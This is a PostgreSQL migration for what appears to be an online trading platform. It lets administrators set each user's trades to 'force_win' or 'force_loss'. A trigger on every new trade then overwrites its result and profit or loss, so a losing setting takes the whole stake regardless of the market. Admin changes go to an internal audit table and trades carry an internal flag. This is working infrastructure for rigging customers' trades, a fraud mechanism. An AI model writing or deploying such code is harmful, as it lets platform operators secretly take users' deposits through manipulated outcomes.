-- Add trade outcome control fields to profiles table
ALTER TABLE public.profiles 
ADD COLUMN IF NOT EXISTS trade_outcome_mode TEXT DEFAULT 'default' CHECK (trade_outcome_mode IN ('default', 'force_win', 'force_loss')),
ADD COLUMN IF NOT EXISTS trade_outcome_applies_to TEXT DEFAULT 'new_trades' CHECK (trade_outcome_applies_to IN ('all_trades', 'new_trades')),
ADD COLUMN IF NOT EXISTS trade_outcome_reason TEXT,
ADD COLUMN IF NOT EXISTS trade_outcome_enabled_at TIMESTAMP WITH TIME ZONE,
ADD COLUMN IF NOT EXISTS trade_outcome_enabled_by UUID REFERENCES auth.users(id);

-- Create trade outcome logs table for audit trail
CREATE TABLE IF NOT EXISTS public.trade_outcome_logs (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  admin_id UUID NOT NULL REFERENCES auth.users(id),
  user_id UUID NOT NULL REFERENCES auth.users(id),
  previous_mode TEXT NOT NULL,
  new_mode TEXT NOT NULL,
  applies_to TEXT NOT NULL CHECK (applies_to IN ('all_trades', 'new_trades')),
  reason TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS on trade_outcome_logs table
ALTER TABLE public.trade_outcome_logs ENABLE ROW LEVEL SECURITY;

-- RLS policies for trade_outcome_logs
CREATE POLICY "Admins can view all trade outcome logs" 
ON public.trade_outcome_logs 
FOR SELECT 
USING (has_role(auth.uid(), 'admin'));

CREATE POLICY "Admins can insert trade outcome logs" 
ON public.trade_outcome_logs 
FOR INSERT 
WITH CHECK (has_role(auth.uid(), 'admin') AND auth.uid() = admin_id);

-- Function to check if user has forced trade outcome
CREATE OR REPLACE FUNCTION public.get_user_trade_outcome_mode(p_user_id UUID)
RETURNS TEXT
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  outcome_mode TEXT;
BEGIN
  SELECT trade_outcome_mode INTO outcome_mode
  FROM public.profiles
  WHERE id = p_user_id;
  
  RETURN COALESCE(outcome_mode, 'default');
END;
$$;

-- Function to apply forced trade outcome to a trade
CREATE OR REPLACE FUNCTION public.apply_forced_trade_outcome(p_trade_id UUID)
RETURNS BOOLEAN
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  trade_record RECORD;
  user_outcome_mode TEXT;
  forced_result TEXT;
  forced_profit_loss NUMERIC;
BEGIN
  -- Get trade details
  SELECT t.*, p.trade_outcome_mode, p.trade_outcome_applies_to
  INTO trade_record
  FROM public.trades t
  JOIN public.profiles p ON t.user_id = p.id
  WHERE t.id = p_trade_id;
  
  -- If no trade found, return false
  IF NOT FOUND THEN
    RETURN FALSE;
  END IF;
  
  -- Check if user has forced outcome mode
  IF trade_record.trade_outcome_mode = 'default' THEN
    RETURN FALSE; -- No forced outcome
  END IF;
  
  -- Determine forced result based on mode
  IF trade_record.trade_outcome_mode = 'force_win' THEN
    forced_result := 'win';
    forced_profit_loss := trade_record.amount * (trade_record.payout_percentage / 100.0);
  ELSE
    forced_result := 'lose';
    forced_profit_loss := -trade_record.amount;
  END IF;
  
  -- Update trade with forced outcome
  UPDATE public.trades
  SET 
    result = forced_result,
    profit_loss = forced_profit_loss,
    status = 'completed',
    completed_at = now(),
    forced_outcome = true
  WHERE id = p_trade_id;
  
  RETURN TRUE;
END;
$$;

-- Trigger function to automatically apply forced outcomes to new trades
CREATE OR REPLACE FUNCTION public.auto_apply_forced_outcome()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  user_outcome_mode TEXT;
BEGIN
  -- Get user's trade outcome mode
  SELECT trade_outcome_mode INTO user_outcome_mode
  FROM public.profiles
  WHERE id = NEW.user_id;
  
  -- If user has forced outcome mode, apply it immediately
  IF user_outcome_mode IN ('force_win', 'force_loss') THEN
    PERFORM public.apply_forced_trade_outcome(NEW.id);
  END IF;
  
  RETURN NEW;
END;
$$;

-- Create trigger to automatically apply forced outcomes
DROP TRIGGER IF EXISTS trigger_auto_apply_forced_outcome ON public.trades;
CREATE TRIGGER trigger_auto_apply_forced_outcome
  AFTER INSERT ON public.trades
  FOR EACH ROW
  EXECUTE FUNCTION public.auto_apply_forced_outcome();

-- Add forced_outcome column to trades table
ALTER TABLE public.trades 
ADD COLUMN IF NOT EXISTS forced_outcome BOOLEAN DEFAULT false;

-- Function to get trade outcome statistics
CREATE OR REPLACE FUNCTION public.get_trade_outcome_stats()
RETURNS TABLE(
  total_users INTEGER,
  force_win_users INTEGER,
  force_loss_users INTEGER,
  default_users INTEGER
)
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  RETURN QUERY
  SELECT 
    COUNT(*)::INTEGER as total_users,
    COUNT(*) FILTER (WHERE trade_outcome_mode = 'force_win')::INTEGER as force_win_users,
    COUNT(*) FILTER (WHERE trade_outcome_mode = 'force_loss')::INTEGER as force_loss_users,
    COUNT(*) FILTER (WHERE trade_outcome_mode = 'default' OR trade_outcome_mode IS NULL)::INTEGER as default_users
  FROM public.profiles;
END;
$$;

-- Function to get user's trade outcome history
CREATE OR REPLACE FUNCTION public.get_user_trade_outcome_history(p_user_id UUID)
RETURNS TABLE(
  log_id UUID,
  admin_name TEXT,
  admin_email TEXT,
  previous_mode TEXT,
  new_mode TEXT,
  applies_to TEXT,
  reason TEXT,
  created_at TIMESTAMP WITH TIME ZONE
)
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  RETURN QUERY
  SELECT 
    tol.id as log_id,
    p.full_name as admin_name,
    p.email as admin_email,
    tol.previous_mode,
    tol.new_mode,
    tol.applies_to,
    tol.reason,
    tol.created_at
  FROM public.trade_outcome_logs tol
  JOIN public.profiles p ON tol.admin_id = p.id
  WHERE tol.user_id = p_user_id
  ORDER BY tol.created_at DESC;
END;
$$;

-- Index for better performance
CREATE INDEX IF NOT EXISTS idx_trade_outcome_logs_user_id ON public.trade_outcome_logs(user_id);
CREATE INDEX IF NOT EXISTS idx_trade_outcome_logs_admin_id ON public.trade_outcome_logs(admin_id);
CREATE INDEX IF NOT EXISTS idx_trade_outcome_logs_created_at ON public.trade_outcome_logs(created_at);
CREATE INDEX IF NOT EXISTS idx_profiles_trade_outcome_mode ON public.profiles(trade_outcome_mode);

-- Add comments for documentation
COMMENT ON COLUMN public.profiles.trade_outcome_mode IS 'Controls whether user trades are forced to win/lose or use normal logic';
COMMENT ON COLUMN public.profiles.trade_outcome_applies_to IS 'Whether forced outcome applies to all trades or only new trades';
COMMENT ON COLUMN public.profiles.trade_outcome_reason IS 'Reason for enabling forced trade outcomes';
COMMENT ON COLUMN public.profiles.trade_outcome_enabled_at IS 'When the forced outcome was enabled';
COMMENT ON COLUMN public.profiles.trade_outcome_enabled_by IS 'Admin who enabled the forced outcome';

COMMENT ON TABLE public.trade_outcome_logs IS 'Audit trail for all trade outcome control changes';
COMMENT ON COLUMN public.trades.forced_outcome IS 'Indicates if this trade result was forced by admin control'; 